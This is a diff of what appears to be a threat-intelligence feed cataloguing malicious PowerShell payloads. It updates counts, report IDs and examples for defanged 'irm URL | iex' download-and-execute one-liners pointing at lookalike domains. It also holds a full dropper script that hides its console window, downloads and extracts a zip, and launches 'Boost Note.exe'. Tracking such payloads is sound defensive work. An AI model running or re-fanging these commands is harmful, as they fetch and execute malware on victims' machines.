@@ -449,12 +449,11 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 39,
-    "ReportCount": 39,
-    "FirstSeen": "2026-11-10T11:59:22.341000+00:00",
-    "LastSeen": "2026-11-17T00:40:35.020000+00:00",
+    "DistinctPayloadCount": 40,
+    "ReportCount": 40,
+    "FirstSeen": "2026-11-10T12:13:59.457000+00:00",
+    "LastSeen": "2026-11-17T11:53:38.648000+00:00",
     "ReportIds": [
-      "cmwan0j4800yq0omlltp1f36f",
       "cmwanjbw9018m0omlq3184wsq",
       "cmwaofa4901pv0oml2dv9jutk",
       "cmwb71nav01nq0nmlm04mhxot",
@@ -492,7 +491,9 @@
       "cmwirhula12jv0omlobsquqwk",
       "cmwisrtbm14hw0omlck8hqp55",
       "cmwj51q3c17cv0oml0cqeivw1",
-      "cmwjyukd3198l0omlbovyvnwg"
+      "cmwjyukd3198l0omlbovyvnwg",
+      "cmwkmw17h1f990oml8ubw5izj",
+      "cmwkmw4kx1f9x0omlu6etnpyg"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
@@ -520,10 +521,11 @@
       "(irm 'https://github[.]pw/click/6e7f0565e9fb474b')|iex",
       "(irm 'https://github[.]pw/off1/139e9a80d631579e')|iex",
       "(irm 'https://github[.]pw/webopc22/7534a6f5a9850f76')|iex",
+      "(irm 'https://github[.]pw/wp/4ff6ecee35528485')|iex",
+      "(irm 'https://github[.]pw/wp/a99138664d16b6b2')|iex",
       "(irm 'https://github[.]pw/wp/e9e0a4eb0e5a4b04')|iex",
       "(irm 'https://nexguard[.]pro/Girya/ff9a9c33c814a1a4')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/3a8b7746765169c8')|iex",
-      "(irm 'https://t-trustresnew[.]com/Girya/7eeb7dc71e67e3f9')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/c2bb5e53eeac1f49')|iex",
       "(irm 'https://t-trustresnew[.]com/click/437fcc74237f6eaa')|iex",
       "(irm 'https://t-trustresnew[.]com/click/9984f7622e099be9')|iex",
@@ -792,11 +794,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 57,
-    "FirstSeen": "2026-11-10T11:36:24.243000+00:00",
+    "ReportCount": 56,
+    "FirstSeen": "2026-11-10T13:35:39.420000+00:00",
     "LastSeen": "2026-11-17T10:13:11.052000+00:00",
     "ReportIds": [
-      "cmwam6zr200qm0omluiv0gc85",
       "cmwaqgcpt029o0omlad0xpp3o",
       "cmwaqh3zq02au0omlbcebaqu0",
       "cmwaqy0fn02fg0omlwphh4u0i",
